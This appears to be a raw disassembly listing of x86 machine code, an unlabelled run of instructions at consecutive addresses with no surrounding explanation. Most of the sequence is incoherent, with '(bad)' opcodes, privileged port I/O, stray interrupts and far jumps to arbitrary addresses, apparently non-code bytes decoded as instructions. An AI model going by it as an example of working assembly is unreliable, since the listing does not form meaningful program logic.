  40d985:	adc    BYTE PTR [edx+0x7542dfc3],al
  40d98b:	outs   dx,BYTE PTR ds:[esi]
  40d98c:	loopne 0x40d9e6
  40d98e:	mov    ecx,0xc7a2cf31
  40d993:	jl     0x40d926
  40d995:	in     eax,0x8b
  40d997:	pop    ds
  40d998:	fisubr WORD PTR [ecx-0x56e7dcba]
  40d99e:	rcl    DWORD PTR [edx-0x4be7bdb],1
  40d9a4:	dec    esi
  40d9a5:	(bad)  
  40d9a7:	sub    eax,0x86aa91f
  40d9ac:	js     0x41cb0680
  40d9b2:	mov    esp,0xd3c2c99c
  40d9b7:	xor    al,0xa7
  40d9b9:	or     eax,0xdee46dd5
  40d9be:	jge    0x40da08
  40d9c0:	mov    WORD PTR [edx-0x7f86e1bd],gs
  40d9c6:	retf   0xc5ac
  40d9c9:	pop    ebp
  40d9ca:	jb     0x40da42
  40d9cc:	loopne 0x40d9f6
  40d9ce:	and    eax,0x3bbd9417
  40d9d3:	jecxz  0x40da34
  40d9d5:	xchg   ebp,eax
  40d9d6:	mov    dh,0x83
  40d9d8:	or     edi,DWORD PTR [edi]
  40d9da:	repnz pop ecx
  40d9dc:	call   FWORD PTR [ebx]
  40d9de:	xchg   ebp,eax
  40d9df:	rcl    DWORD PTR [ecx-0x9],0x2f
  40d9e3:	jnp    0x40da12
  40d9e5:	and    al,0x67
  40d9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9e8:	xlat   BYTE PTR ds:[ebx]
  40d9e9:	aam    0x1a
  40d9eb:	cwde   
  40d9ec:	xor    ebp,esp
  40d9ee:	cmp    eax,0x2aa4ac9d
  40d9f3:	cmp    BYTE PTR [ebp+0x5a],bh
  40d9f6:	leave  
  40d9f7:	pop    ds
  40d9f8:	out    dx,al
  40d9f9:	lock test DWORD PTR [esi+0x36247d2],edi
  40da00:	push   0x43
  40da02:	dec    esi
  40da03:	sbb    eax,0x45b06ce9
  40da08:	aad    0x54
  40da0a:	adc    eax,0xd6c2f9ea
  40da0f:	imul   esp,DWORD PTR [ebx-0x589823fd],0x3dab037
  40da19:	pop    ss
  40da1a:	pop    eax
  40da1b:	dec    edi
  40da1d:	pop    eax
  40da1e:	idiv   DWORD PTR [edi]
  40da20:	xor    cl,BYTE PTR [eax+ecx*8+0x212e3a4b]
  40da27:	adc    BYTE PTR [ebp+ebp*2+0x12],bh
  40da2b:	dec    ebp
  40da2c:	adc    bh,BYTE PTR [esi+0x4e10e288]
  40da32:	pop    esp
  40da33:	aam    0xf2
  40da35:	adc    al,0x8d
  40da37:	int    0x85
  40da39:	sub    eax,edx
  40da3b:	ror    DWORD PTR [eax-0x3ea9bf16],1
  40da41:	add    al,0x86
  40da43:	int    0x39
  40da45:	inc    edi
  40da46:	je     0x40da51
  40da48:	int    0x8b
  40da4a:	pop    esp
  40da4b:	mov    esp,0xe3df8ab0
  40da50:	xchg   ebp,eax
  40da51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da52:	and    eax,0x223ccfcd
  40da57:	jge    0x40da83
  40da59:	test   BYTE PTR [ebp+ebx*8+0x55],al
  40da5d:	mov    dl,0x9d
  40da5f:	call   0x3cfc:0xb9bd5245
  40da66:	int    0xaf
  40da68:	mov    edi,0x58d13176
  40da6d:	fwait
  40da6e:	nop
  40da6f:	aas    
  40da70:	add    esp,esi
  40da72:	shl    DWORD PTR [edi+0x790f013d],cl
  40da78:	into   
  40da79:	or     DWORD PTR [ebp+ebp*1+0x48],esi
  40da7d:	adc    edx,ebp
  40da7f:	add    cl,BYTE PTR [edi]
  40da81:	add    eax,0x272e6e19
  40da86:	or     DWORD PTR [edi-0x10],esp
  40da89:	int    0xff
  40da8b:	adc    dh,BYTE PTR [ebx+0x4a]
  40da8e:	pop    ds
  40da8f:	mov    eax,ds:0x425f759d
  40da94:	ret    0x52df
  40da97:	adc    dl,dl
  40da99:	push   0x1d
  40da9b:	popa   
  40da9c:	popf   
  40da9d:	sbb    cl,BYTE PTR [ecx]
  40da9f:	call   0x5ded:0xeb3fe55
  40daa6:	div    DWORD PTR [ebx+edi*1+0x5a]
  40daaa:	xchg   ebp,eax
  40daab:	xor    al,0x93
  40daad:	outs   dx,BYTE PTR ds:[esi]
  40daae:	jo     0x40da33
  40dab0:	pop    ebp
  40dab1:	lahf   
  40dab2:	gs stos BYTE PTR es:[edi],al
  40dab4:	dec    edx
  40dab5:	inc    esp
  40dab6:	pushf  
  40dab7:	jmp    0xdd8e30e
  40dabc:	fs cli 
  40dabe:	ret    0x7ecb
  40dac1:	mov    ebp,0xe4c62a0
  40dac6:	push   ss
  40dac7:	(bad)  
  40dac8:	fadd   QWORD PTR [ebp-0xb70fff3]
  40dace:	outs   dx,BYTE PTR ds:[esi]
  40dacf:	xlat   BYTE PTR ds:[ebx]
  40dad0:	mov    ecx,0xc77899cd
  40dad5:	pushf  
  40dad6:	leave  
  40dad7:	test   eax,0xeec146d3
  40dadc:	cmp    al,0x61
  40dade:	mov    dl,0xba
  40dae0:	and    DWORD PTR [ecx+0x53a03b7c],0x7083e132
  40daea:	cdq    
  40daeb:	jmp    0xc93f:0x388de86c
  40daf2:	mov    ecx,0xdbd1bfd2
  40daf7:	add    edi,DWORD PTR [ebx]
  40daf9:	repnz xor DWORD PTR [ebp-0x668adf88],esi
  40db00:	popf   
  40db01:	mov    dh,0x8a
  40db03:	pop    ebx
  40db04:	inc    esi
  40db05:	(bad)  
  40db06:	stc    
  40db07:	mov    ecx,0x7e9e8d5b
  40db0c:	and    eax,0x90d9fee4
  40db11:	jle    0x40daa6
  40db13:	xor    ebp,DWORD PTR [ecx+0x52a1a833]
  40db19:	gs je  0x40db28
  40db1c:	add    DWORD PTR [ebx+0x62da69ba],esp
  40db22:	lahf   
  40db23:	dec    ebp
  40db24:	jo     0x40db38
  40db26:	adc    eax,0x5ef042b1
  40db2b:	pushf  
  40db2c:	mov    esp,DWORD PTR [eax-0x70e7c71b]
  40db32:	es push ds
  40db34:	xchg   ebp,eax
  40db35:	stc    
  40db36:	add    BYTE PTR ds:0x688f4e3a,ah
  40db3c:	ret    
  40db3d:	xor    al,0x7f
  40db3f:	dec    edi
  40db40:	xor    eax,0x2da0a742
  40db45:	sahf   
  40db46:	cmp    DWORD PTR [edx-0x25d8bb8f],edx
  40db4c:	sub    DWORD PTR [esi-0x1],ebp
  40db4f:	loop   0x40dbbb
  40db51:	cli    
  40db52:	pop    ebp
  40db53:	inc    ebx
  40db54:	jmp    0xc1444bbd
  40db59:	(bad)  
  40db5a:	xchg   esp,eax
  40db5b:	and    DWORD PTR [ebp*1+0x2170c3d6],eax
  40db62:	cld    
  40db63:	arpl   di,cx
  40db65:	data16 add BYTE PTR [ebx],dl
  40db68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db69:	add    eax,0xdd149db6
  40db6e:	xor    dl,BYTE PTR [edx+0xd]
  40db71:	(bad)  
  40db72:	call   0x7e28:0xca8d9ab6
  40db79:	xor    eax,DWORD PTR [ebx+0x56]
  40db7c:	out    0x16,eax
  40db7e:	aad    0x43
  40db80:	std    
  40db81:	mov    WORD PTR [eax-0x63005cc],ss
  40db87:	(bad)  
  40db88:	fs xchg edi,eax
  40db8a:	out    dx,eax
  40db8b:	cmp    BYTE PTR [ebx-0x6d57220c],0x6
  40db92:	(bad)  
  40db93:	pop    esi
  40db94:	jns    0x40dbd9
  40db96:	sub    BYTE PTR [ecx+0x2c],0xb7
  40db9a:	push   0xdcabc84a
  40db9f:	test   bh,bh
  40dba1:	jecxz  0x40dc12
  40dba3:	popa   
  40dba4:	mov    ebp,0x71a41e15
  40dba9:	loopne 0x40dc0d
  40dbab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbac:	push   ebx
  40dbad:	lahf   
  40dbae:	add    esi,DWORD PTR [ecx+ebp*2-0x22103a1c]
  40dbb5:	xor    DWORD PTR [edx-0x54eb6487],0xd76b9560
  40dbbf:	(bad)  
  40dbc0:	cmp    al,0x43
  40dbc2:	push   edi
  40dbc3:	xor    dh,BYTE PTR [edi]
  40dbc5:	hlt    
  40dbc6:	shr    BYTE PTR [ebp-0x6b6b1a67],cl
  40dbcc:	sub    eax,0xeffe7832
  40dbd1:	dec    ebp
  40dbd2:	inc    edi
  40dbd3:	call   FWORD PTR [edi+0x40]
  40dbd6:	dec    ebx
  40dbd7:	mov    DWORD PTR [edi+0x42],esi
  40dbda:	dec    edx
  40dbdb:	bnd ret 0xfffd
  40dbdf:	push   edx
  40dbe0:	pushf  
  40dbe1:	sbb    al,bl
  40dbe3:	and    BYTE PTR [eax-0x16],ah
  40dbe6:	and    DWORD PTR [ecx-0x6bc49a7c],esp
  40dbec:	mov    bh,0x6c
  40dbee:	jnp    0x40dc05
  40dbf0:	or     bl,BYTE PTR [ebx+0x8]
  40dbf3:	outs   dx,DWORD PTR ds:[esi]
  40dbf4:	mov    dh,0xad
  40dbf6:	jo     0x40dc0a
  40dbf8:	sub    ecx,DWORD PTR [ebx]
  40dbfa:	shl    DWORD PTR [edx+0x78],0x63
  40dbfe:	lea    esp,ds:[edx-0x3e]
  40dc02:	aad    0xc5
  40dc04:	inc    ecx
  40dc05:	ins    DWORD PTR es:[edi],dx
  40dc06:	mov    esi,0x5a275ddf
  40dc0c:	or     dl,BYTE PTR [ebx+ecx*8]
  40dc0f:	mov    eax,0xc087235a
  40dc14:	lods   al,BYTE PTR ds:[esi]
  40dc15:	inc    ebx
  40dc16:	xchg   ecx,eax
  40dc17:	fist   DWORD PTR [ebp+0x29]
  40dc1a:	push   0xff87da4c
  40dc1f:	arpl   WORD PTR [eax+0x56],sp
  40dc22:	aam    0xdc
  40dc24:	les    ebx,FWORD PTR [ebx-0x4d8cc3e9]
  40dc2a:	outs   dx,DWORD PTR ds:[esi]
  40dc2b:	(bad)  
  40dc2c:	stos   DWORD PTR es:[edi],eax
  40dc2d:	xchg   ebx,eax
  40dc2e:	cwde   
  40dc2f:	aam    0x32
  40dc31:	pop    esi
  40dc32:	leave  
  40dc33:	adc    al,0x78
  40dc35:	sub    eax,0xdfa1dfbb
  40dc3a:	jae    0x40dc42
  40dc3c:	data16 sahf 
  40dc3e:	pop    ss
  40dc3f:	clc    
  40dc40:	out    dx,eax
  40dc41:	sub    eax,0x32c95309
  40dc46:	mov    ds,WORD PTR [ecx+edi*1-0x16]
  40dc4a:	adc    ebp,0xfffffffa
  40dc4d:	xor    DWORD PTR [esi-0x3b18e307],0x9
  40dc54:	je     0x40dca3
  40dc56:	xlat   BYTE PTR ds:[ebx]
  40dc57:	popf   
  40dc58:	jmp    0x40dca4
  40dc5a:	leave  
  40dc5b:	in     al,0x90
  40dc5d:	ins    BYTE PTR es:[edi],dx
  40dc5e:	fbld   TBYTE PTR [edi+ebp*1+0x61]
  40dc62:	repz mov ebp,0x837d4507
  40dc68:	sub    BYTE PTR [ebx-0x6081d934],ch
  40dc6e:	fwait
  40dc6f:	push   ebp
  40dc70:	add    dl,BYTE PTR [bp+0x6e]
  40dc74:	sub    BYTE PTR [ecx-0x46bcbefd],dl
  40dc7a:	xor    BYTE PTR [eax+0x1c],ah
  40dc7d:	punpcklwd mm1,DWORD PTR [ebp+0x5474473d]
  40dc84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc85:	int3   
  40dc86:	mov    ?,edx
  40dc88:	shl    BYTE PTR [edx+0x33],1
  40dc8b:	mov    DWORD PTR [edi+esi*2],edx
  40dc8e:	mov    edi,0x6508893f
  40dc93:	pushf  
  40dc94:	inc    ebp
  40dc95:	out    0xb7,al
  40dc97:	mov    edx,0xc36c9be8
  40dc9c:	mov    ah,0xdb
  40dc9e:	adc    ah,BYTE PTR [ebp+0x2b]
  40dca1:	in     eax,dx
  40dca2:	das    
  40dca3:	mov    dh,0x2f
  40dca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dca6:	sbb    DWORD PTR ss:[ecx-0x4d080dfe],esp
  40dcad:	pop    ebp
  40dcae:	rcl    BYTE PTR ds:0x316030b2,cl
  40dcb4:	pusha  
  40dcb5:	in     al,dx
  40dcb6:	shr    DWORD PTR [ecx+ebx*4],0x92
  40dcba:	je     0x40dce7
  40dcbc:	pop    ecx
  40dcbd:	cmp    DWORD PTR [ebp-0x37],esp
  40dcc0:	adc    ecx,DWORD PTR [esi+0x33]
  40dcc3:	mov    dl,0x53
  40dcc5:	pop    ds
  40dcc6:	or     BYTE PTR [edx+eax*4+0x370fda15],0x1e
  40dcce:	jmp    0x40dc8f
  40dcd0:	and    esp,edx
  40dcd2:	ret    
  40dcd3:	call   0x9d26:0x7f0918ba
  40dcda:	fdivr  DWORD PTR [edi-0x21]
  40dcdd:	fucom  st(1)
  40dcdf:	loope  0x40dd29
  40dce1:	addr16 dec ebx
  40dce3:	dec    edi
  40dce4:	and    al,0xd9
  40dce6:	jg     0x40dd57
  40dce8:	inc    ebp
  40dce9:	push   ss
  40dcea:	bound  ebp,QWORD PTR [ebp+0xf11a895]
  40dcf0:	in     al,0x18
  40dcf2:	cwde   
  40dcf3:	pop    ebp
  40dcf4:	(bad)  
  40dcf5:	aaa    
  40dcf6:	sub    dl,BYTE PTR [ebx]
  40dcf8:	fsubrp st(1),st
  40dcfa:	cwde   
  40dcfb:	test   ebp,eax
  40dcfd:	push   es
  40dcfe:	daa    
  40dcff:	mov    eax,DWORD PTR ds:0x195d7eb1
  40dd05:	les    edx,FWORD PTR [edi]
  40dd07:	lods   al,BYTE PTR ds:[esi]
  40dd08:	pop    ecx
  40dd09:	xchg   edx,eax
  40dd0a:	rol    bl,0xcd
  40dd0d:	dec    esp
  40dd0e:	or     esp,DWORD PTR ds:0x8efca490
  40dd14:	icebp  
  40dd15:	mov    ebp,0xeb6bb469
  40dd1a:	shr    BYTE PTR [edx-0x43],cl
  40dd1d:	call   edi
  40dd1f:	call   0x6275:0x27b32186
  40dd26:	xlat   BYTE PTR ss:[ebx]
  40dd28:	test   eax,0xa782c992
  40dd2d:	add    al,0xa7
  40dd2f:	xor    al,0xcd
  40dd31:	push   ecx
  40dd32:	pop    edx
  40dd33:	mov    bl,0x68
  40dd35:	sub    cl,dl
  40dd37:	dec    esi
  40dd38:	sbb    esi,DWORD PTR ds:0xef5dc1b6
  40dd3e:	sub    DWORD PTR [ecx],ebp
  40dd40:	lods   al,BYTE PTR ds:[esi]
  40dd41:	sbb    eax,0x8c857e80
  40dd46:	out    dx,eax
  40dd47:	sbb    BYTE PTR [edi-0x29cb5288],al
  40dd4d:	retf   0x969c
  40dd50:	sbb    al,0xa3
  40dd52:	add    ecx,DWORD PTR [esi+0x18]
  40dd55:	adc    DWORD PTR [ecx+0x7620ca8],esi
  40dd5b:	mov    bl,al
  40dd5d:	shl    ebp,0xf8
  40dd60:	push   ebx
  40dd61:	jg     0x40dd18
  40dd63:	mov    ds:0x849d366b,al
  40dd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd69:	ss sub al,0x26
  40dd6c:	xchg   ebx,eax
  40dd6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6e:	push   edi
  40dd6f:	and    eax,0x1ac5194e
  40dd74:	scas   eax,DWORD PTR es:[edi]
  40dd75:	int3   
  40dd76:	mov    ebx,0xa43444b0
  40dd7b:	rcl    BYTE PTR [esi+0x4d],0xd4
  40dd7f:	mov    cl,0x7f
  40dd81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd82:	or     bl,BYTE PTR [edi]
  40dd84:	xchg   edi,esp
  40dd86:	dec    edx
  40dd87:	dec    esi
  40dd88:	inc    edi
  40dd89:	fiadd  WORD PTR [edx-0x35]
  40dd8c:	push   eax
  40dd8d:	xor    DWORD PTR [edx+0x4c594561],ecx
  40dd93:	rcl    BYTE PTR [eax-0x787d0a41],cl
  40dd99:	mov    esp,0x9f9b5595
  40dd9e:	and    DWORD PTR [edx+0x5d16ed6e],0x2e
  40dda5:	xchg   ebp,eax
  40dda6:	mov    bh,0xda
  40dda8:	xor    DWORD PTR ss:[ebp-0x25284fd6],edx
  40ddaf:	mov    esi,0xf12c403f
  40ddb4:	stc    
  40ddb5:	in     al,dx
  40ddb6:	test   BYTE PTR [edx-0x19],dl
  40ddb9:	pop    edi
  40ddba:	xchg   eax,eax
  40ddbc:	push   ss
  40ddbd:	cwde   
  40ddbe:	xchg   edx,eax
  40ddbf:	and    eax,0xe28d9fb7
  40ddc4:	retf   
  40ddc5:	add    DWORD PTR [esi+0x7426b8b4],ebx
  40ddcb:	mov    ebx,0xac77199
  40ddd0:	jno    0x40de2e
  40ddd2:	pop    edi
  40ddd3:	xchg   BYTE PTR [edi-0x766dc693],al
  40ddd9:	xchg   esi,eax
  40ddda:	jecxz  0x40de37
  40dddc:	mov    eax,fs
  40ddde:	xchg   DWORD PTR [edi],esi
  40dde0:	push   ebx
  40dde1:	loope  0x40de43
  40dde3:	sbb    ecx,DWORD PTR [edx-0x5740d4ce]
  40dde9:	mov    bl,0xb7
  40ddeb:	js     0x40dd7e
  40dded:	stc    
  40ddee:	jo     0x40ddd4
  40ddf0:	hlt    
  40ddf1:	pop    edi
  40ddf2:	dec    ebx
  40ddf3:	cld    
  40ddf4:	(bad)
  40ddf7:	xor    BYTE PTR [ebx+0x20b1e892],cl
  40ddfd:	mov    ah,BYTE PTR [ebx+0x10b54609]
  40de03:	mov    dl,0x43
  40de05:	jl     0x40ddf7
  40de07:	stos   DWORD PTR es:[edi],eax
  40de08:	(bad)  
  40de09:	mov    bh,0xda
  40de0b:	test   eax,0xf3bdb29a
  40de10:	xor    bl,BYTE PTR [ecx+0x1d]
  40de13:	pop    edx
  40de14:	into   
  40de15:	sbb    cl,BYTE PTR [ecx]
  40de17:	pop    edi
  40de18:	stos   BYTE PTR es:[edi],al
  40de19:	adc    ebx,ebx
  40de1b:	fptan  
  40de1d:	retf   
  40de1e:	inc    ebp
  40de1f:	mov    eax,0x578708b8
  40de24:	mov    ecx,0x948801de
  40de29:	scas   al,BYTE PTR es:[edi]
  40de2a:	adc    esp,DWORD PTR [edi]
  40de2c:	xor    eax,0x997813bb
  40de31:	pop    ebx
  40de32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de34:	or     eax,0xd0cbe4d6
  40de39:	or     ebp,DWORD PTR [edi+0x134e2b56]
  40de3f:	inc    edx
  40de40:	jnp    0x40de7d
  40de42:	xor    ch,BYTE PTR [esi-0x3f1da310]
  40de48:	xor    al,ah
  40de4a:	jg     0x40de66
  40de4c:	ret    0x4eed
  40de4f:	gs mov ecx,ecx
  40de52:	push   ecx
  40de53:	test   DWORD PTR [ebx-0x20],edi
  40de56:	test   BYTE PTR [eax-0x25],bh
  40de59:	icebp  
  40de5a:	xor    ch,BYTE PTR [eax+edx*8+0x6c65bb0]
  40de61:	cmp    BYTE PTR [eax+ecx*8],dh
  40de64:	push   eax
  40de65:	aas    
  40de66:	ja     0x40de4e
  40de68:	lds    ebx,FWORD PTR [edx-0x5bdb29ee]
  40de6e:	std    
  40de6f:	or     edx,eax
  40de71:	sti    
  40de72:	ss jecxz 0x40de72
  40de75:	adc    bh,BYTE PTR [esi+0x70]
  40de78:	pop    ds
  40de79:	mov    dl,0x75
  40de7b:	dec    edx
  40de7c:	or     ch,BYTE PTR [eax+0x55d6367f]
  40de82:	inc    eax
  40de83:	clc    
  40de84:	shr    ecx,0x45
  40de87:	mov    ds:0xa70d833b,al
  40de8c:	mov    al,0x8e
  40de8e:	dec    ecx
  40de8f:	lods   eax,DWORD PTR ds:[esi]
  40de90:	pop    ecx
  40de91:	mov    ecx,0xec9f8255
  40de96:	lods   eax,DWORD PTR ds:[esi]
  40de97:	loop   0x40debd
  40de99:	sub    BYTE PTR [edx+0x53],bh
  40de9c:	cmp    eax,DWORD PTR [ebx+0x58858fe3]
  40dea2:	xchg   BYTE PTR [esi+0x5a],bh
  40dea5:	xchg   esi,eax
  40dea6:	mov    eax,0x680972d0
  40deab:	dec    eax
  40deac:	xchg   edi,eax
  40dead:	arpl   WORD PTR [ebx+0x75],si
  40deb0:	dec    edi
  40deb1:	icebp  
  40deb2:	add    ecx,DWORD PTR [ebx]
  40deb4:	push   0xffffffb9
  40deb6:	mov    al,0xd5
  40deb8:	out    0x8b,eax
  40deba:	(bad)  
  40debb:	cli    
  40debc:	(bad)  
  40debd:	mov    cl,0x1a
  40debf:	bound  esp,QWORD PTR [esi-0x6a]
  40dec2:	sti    
  40dec3:	ret    0x9161
  40dec6:	xchg   esi,eax
  40dec7:	or     al,0x42
  40dec9:	je     0x40df3f
  40decb:	std    
  40decc:	lods   al,BYTE PTR ds:[esi]
  40decd:	pop    edi
  40dece:	rcl    DWORD PTR [esi],0x57
  40ded1:	xchg   ebp,eax
  40ded2:	jae    0x40de6c
  40ded4:	jle    0x40df1a
  40ded6:	dec    ebx
  40ded7:	pushf  
  40ded8:	mov    cl,0x59
  40deda:	sub    cl,BYTE PTR [esi+0x208950d4]
  40dee0:	jecxz  0x40df44
  40dee2:	pop    eax
  40dee3:	sbb    DWORD PTR [edx],ecx
  40dee5:	mov    al,ds:0xc74bf45d
  40deea:	mov    ds:0x3a2cf277,eax
  40deef:	fwait
  40def0:	mov    bh,0x52
  40def2:	mov    al,ds:0x59f6bb92
  40def7:	add    ecx,DWORD PTR [ebp+0x29bf9693]
  40defd:	addr16 mov bl,0x34
  40df00:	call   0x187f50e9
  40df05:	mov    ah,0x3a
  40df07:	out    0xff,eax
  40df09:	push   eax
  40df0a:	or     DWORD PTR ds:0xd577a1d,edx
  40df10:	push   0x4342ef8a
  40df15:	(bad)  
  40df16:	in     al,dx
  40df17:	call   0xdc20:0x21f3dbb3
  40df1e:	sti    
  40df1f:	ss daa 
  40df21:	loopne 0x40df2e
  40df23:	cmp    eax,0xfdc868d0
  40df28:	or     esi,edx
  40df2a:	jge    0x40df9c
  40df2c:	xchg   ebx,eax
  40df2d:	int    0x93
  40df2f:	xchg   esp,eax
  40df30:	jl     0x40df78
  40df32:	shl    DWORD PTR [eax-0x1f17d6a3],0xf
  40df39:	aas    
  40df3a:	mov    al,ds:0x56b67d90
  40df3f:	addr16 inc ecx
  40df41:	push   ebp
  40df42:	inc    ebx
  40df44:	sahf   
  40df45:	push   edi
  40df46:	push   ebp
  40df47:	imul   ecx,DWORD PTR [ebp+edx*8+0x72028c00],0x4a
  40df4f:	addr16 mov bh,0xb3
  40df52:	xchg   edx,ebx
  40df54:	repnz xchg edi,eax
  40df56:	fst    DWORD PTR [edx+0x6d]
  40df59:	sahf   
  40df5a:	sub    BYTE PTR [ebx-0x3c167c2f],bl
  40df60:	(bad)  
  40df61:	ret    
  40df62:	jmp    0x5f1b:0x40c2fca5
  40df69:	popf   
  40df6a:	cmp    esi,edi
  40df6c:	scas   al,BYTE PTR es:[edi]
  40df6d:	sub    cl,BYTE PTR [ecx+0x24]
  40df70:	push   esp
  40df71:	add    ah,bh
  40df73:	dec    esp
  40df74:	add    esp,ebp
  40df76:	xor    dl,ch
  40df78:	lahf   
  40df79:	cli    
  40df7a:	fist   DWORD PTR [edx]
  40df7c:	jb     0x40df42
  40df7e:	add    ah,BYTE PTR [esi]
  40df80:	ret    0x74db
  40df83:	jae    0x40df40
  40df85:	mov    dh,0xb8
  40df87:	std    
  40df88:	xor    bl,BYTE PTR [edx]
  40df8a:	dec    esi
  40df8b:	test   eax,0xec7978ca
  40df90:	sub    cl,BYTE PTR [esi]
  40df92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df93:	pop    eax
  40df94:	sub    eax,0x3dec7dc8
  40df99:	mov    esi,0x26dbead6
  40df9e:	and    DWORD PTR [esi+eiz*8+0x64de8a12],ebp
  40dfa5:	das    
  40dfa6:	xchg   edi,eax
  40dfa7:	jmp    0xcf03615
  40dfac:	daa    
  40dfad:	xlat   BYTE PTR ds:[ebx]
  40dfae:	std    
  40dfaf:	pop    ebx
  40dfb0:	fstp   TBYTE PTR [edx-0x34eddbf7]
  40dfb6:	dec    esi
  40dfb7:	jp     0x40dfbc
  40dfb9:	jge    0x40df3d
  40dfbb:	les    eax,FWORD PTR [eax+0x28038a4b]
  40dfc1:	xor    al,0x5e
  40dfc3:	je     0x40e032
  40dfc5:	push   eax
  40dfc6:	jno    0x40e011
  40dfc8:	xchg   ebx,eax
  40dfc9:	mov    ecx,0xe08b76c
  40dfce:	mov    bh,0x2c
  40dfd0:	or     ch,BYTE PTR [ebp-0x60]
  40dfd3:	or     DWORD PTR [ebx],ebx
  40dfd5:	in     eax,0x3d
  40dfd7:	jle    0x40df9e
  40dfd9:	xchg   DWORD PTR ds:0x54a73e70,esp
  40dfdf:	cmp    BYTE PTR [esi],al
  40dfe1:	and    edi,DWORD PTR [esi+ebp*2-0x6f]
  40dfe5:	test   ebx,ebx
  40dfe7:	cmp    ebp,DWORD PTR [ecx]
  40dfe9:	fiadd  WORD PTR [ecx]
  40dfeb:	in     eax,dx
  40dfec:	popa   
  40dfed:	jnp    0x40df9a
  40dfef:	or     al,0x85
  40dff1:	inc    ebp
  40dff2:	jb     0x40dffd
  40dff4:	push   edx
  40dff5:	out    dx,eax
  40dff6:	int3   
  40dff7:	pop    edx
  40dff8:	popa   
  40dff9:	loope  0x40dfc0
  40dffb:	mov    ds:0x572986f8,al
  40e000:	cli    
  40e001:	mov    edx,0x9531ff68
  40e006:	faddp  st(2),st
  40e008:	not    DWORD PTR [edi-0x79ec1ddf]
  40e00e:	call   0xbf0fe79c
  40e013:	aas    
  40e014:	xchg   esp,eax
  40e015:	add    ebp,ecx
  40e017:	ret    0xbb13
  40e01a:	aam    0x7a
  40e01c:	xor    DWORD PTR [ebp+0x7871dcf7],0xe4f4d32b
  40e026:	adc    esp,esp
  40e028:	push   ss
  40e029:	fs test eax,0x1fb15748
  40e02f:	pop    esp
  40e030:	fwait
  40e031:	mov    DWORD PTR [edi],esp
  40e033:	test   DWORD PTR [edx],ebx
  40e035:	inc    eax
  40e036:	daa    
  40e037:	push   cs
  40e038:	out    0x65,al
  40e03a:	ds jne 0x40dff5
  40e03d:	rcl    ecx,0x74
  40e040:	enter  0x9fa3,0x3a
  40e044:	sub    BYTE PTR [ebp-0x36cdcd44],bl
  40e04a:	add    DWORD PTR [edx+edi*2+0x73],0x67
  40e04f:	into   
  40e050:	aaa    
  40e051:	mov    edi,DWORD PTR [edi]
  40e053:	stos   BYTE PTR es:[edi],al
  40e054:	pop    ecx
  40e055:	cs jbe 0x40e03a
  40e058:	inc    eax
  40e059:	jecxz  0x40dfff
  40e05b:	dec    ebx
  40e05c:	jp     0x40e05e
  40e05e:	adc    cl,BYTE PTR [eax]
  40e060:	xchg   edi,eax
  40e061:	cmp    eax,0x3ecc5c76
  40e066:	outs   dx,BYTE PTR ds:[esi]
  40e067:	test   DWORD PTR [eax+0x10],0x68c07840
  40e06e:	mov    eax,0xcd9eaa8a
  40e073:	xlat   BYTE PTR ds:[ebx]
  40e074:	push   ebx
  40e075:	in     al,dx
  40e076:	adc    eax,DWORD PTR [ebp-0x45]
  40e079:	mov    DWORD PTR [ecx+0x2e91ab2a],esp
  40e07f:	fucomp st(3)
  40e081:	lahf   
  40e082:	add    ax,0x1e08
  40e086:	or     eax,0x9e9070ae
  40e08b:	ret    
  40e08c:	aad    0xaf
  40e08e:	lods   eax,DWORD PTR ds:[esi]
  40e08f:	cmp    dl,bh
  40e091:	and    BYTE PTR [esi],dl
  40e093:	adc    ebp,DWORD PTR [edi+0x3a]
  40e096:	shr    DWORD PTR [edx],cl
  40e098:	stos   BYTE PTR es:[edi],al
  40e099:	cmp    al,0x70
  40e09b:	into   
  40e09c:	leave  
  40e09d:	loop   0x40e043
  40e09f:	gs pusha 
  40e0a1:	sub    BYTE PTR [eax+0x3b525c4c],dh
  40e0a7:	xchg   edx,eax
  40e0a8:	rol    DWORD PTR [eax+ebx*4-0xb9b4982],cl
  40e0af:	jb     0x40e08e
  40e0b1:	mov    edi,0x69c82d31
  40e0b6:	dec    edi
  40e0b7:	inc    ebx
  40e0b8:	and    BYTE PTR [ebx+0x50803962],dh
  40e0be:	in     al,dx
  40e0bf:	mov    ecx,0x72184f76
  40e0c4:	(bad)  
  40e0c5:	popf   
  40e0c6:	mov    cl,0xbf
  40e0c8:	mov    ebx,0x418bed62
  40e0cd:	pop    esp
  40e0ce:	xor    ebx,ecx
  40e0d0:	and    cl,dl
  40e0d2:	and    DWORD PTR [edx+0x13],ebx
  40e0d5:	mov    ebp,0x472865f9
  40e0da:	iret   
  40e0db:	cli    
  40e0dc:	cwde   
  40e0dd:	cmp    cl,dl
  40e0df:	or     BYTE PTR [edx-0x1223295a],dh
  40e0e5:	or     BYTE PTR [ebp+eax*2+0x18],al
  40e0e9:	xor    ah,BYTE PTR [eax]
  40e0eb:	(bad)  
  40e0ec:	and    BYTE PTR [eax-0x5f],al
  40e0ef:	pop    edx
  40e0f0:	mov    BYTE PTR [eax-0x60],al
  40e0f3:	cmc    
  40e0f4:	or     DWORD PTR [ebx],ebp
  40e0f6:	(bad)  
  40e0f8:	or     DWORD PTR [esi],ebp
  40e0fa:	(bad)  
  40e0fb:	sub    al,0xa1
  40e0fd:	or     BYTE PTR [ecx],al
  40e0ff:	sbb    eax,0xa7a3ccf9
  40e104:	jno    0x40e141
  40e106:	xchg   ebp,eax
  40e107:	cmp    DWORD PTR [edx+0x47],0x324e3b50
  40e10e:	mov    bh,0xd8
  40e110:	dec    edx
  40e111:	daa    
  40e112:	ja     0x40e0da
  40e114:	jecxz  0x40e0cb
  40e116:	sti    
  40e117:	and    BYTE PTR [ebx],ah
